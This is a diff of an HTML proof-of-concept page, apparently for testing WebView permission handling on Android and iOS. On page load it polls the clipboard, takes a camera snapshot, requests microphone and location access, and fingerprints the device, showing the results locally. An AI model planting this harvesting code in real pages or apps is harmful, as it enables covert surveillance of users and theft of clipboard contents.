@@ -1,63 +1,63 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Cross-Platform Test</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body { font-family: sans-serif; padding: 20px; }
-        .hidden { display: none; }
-        .section { margin-bottom: 20px; }
-    </style>
+  <title>Cross-Platform Exploit Test</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { font-family: sans-serif; padding: 20px; }
+    .hidden { display: none; }
+    .section { margin-bottom: 20px; }
+    pre { background: #eee; padding: 10px; overflow-x: auto; }
+  </style>
 </head>
 <body onload="initiateExploits();">
-    <h1>🔓 WebView Security (Android + iOS)</h1>
+  <h1>🔓 WebView Security Abuse (Android + iOS)</h1>
 
-    <div class="section">
-        <h3>📋 Clipboard Data:</h3>
-        <div id="clipboardData" style="border: 1px dashed #999; padding: 10px; min-height: 50px;"></div>
-    </div>
+  <div class="section">
+    <h3>📋 Clipboard Data:</h3>
+    <div id="clipboardData" style="border: 1px dashed #999; padding: 10px; min-height: 50px;"></div>
+  </div>
 
-    <div class="section">
-        <h3>📷 Captured Camera Image:</h3>
-        <video id="videoPreview" class="hidden" autoplay playsinline></video>
-        <img id="capturedImage" class="hidden" />
-    </div>
+  <div class="section">
+    <h3>📷 Captured Camera Image:</h3>
+    <video id="videoPreview" class="hidden" autoplay playsinline></video>
+    <img id="capturedImage" class="hidden" />
+  </div>
 
-    <script>
-        function getClipboardData() {
-            if (navigator.clipboard && navigator.clipboard.readText) {
-                setInterval(() => {
-                    navigator.clipboard.readText().then(text => {
-                        if (text) {
-                            document.getElementById('clipboardData').textContent = text;
-                        }
-                    }).catch(err => {
-                        console.warn("Clipboard blocked:", err.message);
-                    });
-                }, 2000);
-            } else {
-                console.warn("Clipboard API not available");
-            }
-        }
+  <div class="section">
+    <h3>🎤 Microphone Access:</h3>
+    <div id="micStatus">Waiting...</div>
+  </div>
 
-        function requestCameraAccess() {
-            const video = document.getElementById('videoPreview');
-            const img = document.getElementById('capturedImage');
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-                    video.srcObject = stream;
-                    video.classList.remove("hidden");
-                    setTimeout(() => {
-                        captureImage(video, img);
-                        stream.getTracks().forEach(track => track.stop());
-                    }, 4000);
-                }).catch(err => {
-                    console.error("Camera access denied:", err.message);
-                });
-            }
-        }
+  <div class="section">
+    <h3>📍 Location:</h3>
+    <div id="locationInfo">Fetching location...</div>
+  </div>
 
-        function captureImage(video, img) {
+  <div class="section">
+    <h3>🧠 Device Fingerprint:</h3>
+    <pre id="deviceInfo"></pre>
+  </div>
+
+  <script>
+    function getClipboardData() {
+      if (navigator.clipboard && navigator.clipboard.readText) {
+        setInterval(() => {
+          navigator.clipboard.readText().then(text => {
+            if (text) document.getElementById('clipboardData').textContent = text;
+          }).catch(err => console.warn("Clipboard blocked:", err.message));
+        }, 2000);
+      }
+    }
+
+    function requestCameraAccess() {
+      const video = document.getElementById('videoPreview');
+      const img = document.getElementById('capturedImage');
+      if (navigator.mediaDevices?.getUserMedia) {
+        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+          video.srcObject = stream;
+          video.classList.remove("hidden");
+          setTimeout(() => {
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -65,12 +65,58 @@
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             img.src = canvas.toDataURL('image/png');
             img.classList.remove('hidden');
-        }
+            stream.getTracks().forEach(t => t.stop());
+          }, 4000);
+        }).catch(err => console.error("Camera denied:", err.message));
+      }
+    }
 
-        function initiateExploits() {
-            getClipboardData();
-            requestCameraAccess();
-        }
-    </script>
+    function requestMicrophone() {
+      const micStatus = document.getElementById("micStatus");
+      if (navigator.mediaDevices?.getUserMedia) {
+        navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
+          micStatus.textContent = "🎙️ Microphone access granted";
+          stream.getTracks().forEach(t => t.stop());
+        }).catch(err => {
+          micStatus.textContent = "🚫 Microphone access denied: " + err.message;
+        });
+      } else {
+        micStatus.textContent = "Microphone API not available";
+      }
+    }
+
+    function requestLocation() {
+      const output = document.getElementById("locationInfo");
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          output.textContent = `Latitude: ${pos.coords.latitude}, Longitude: ${pos.coords.longitude}`;
+        }, err => {
+          output.textContent = `Location denied: ${err.message}`;
+        });
+      } else {
+        output.textContent = "Geolocation not supported";
+      }
+    }
+
+    function fingerprintDevice() {
+      const info = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        cores: navigator.hardwareConcurrency,
+        memory: navigator.deviceMemory,
+        screen: `${screen.width}x${screen.height}`
+      };
+      document.getElementById("deviceInfo").textContent = JSON.stringify(info, null, 2);
+    }
+
+    function initiateExploits() {
+      getClipboardData();
+      requestCameraAccess();
+      requestMicrophone();
+      requestLocation();
+      fingerprintDevice();
+    }
+  </script>
 </body>
 </html>
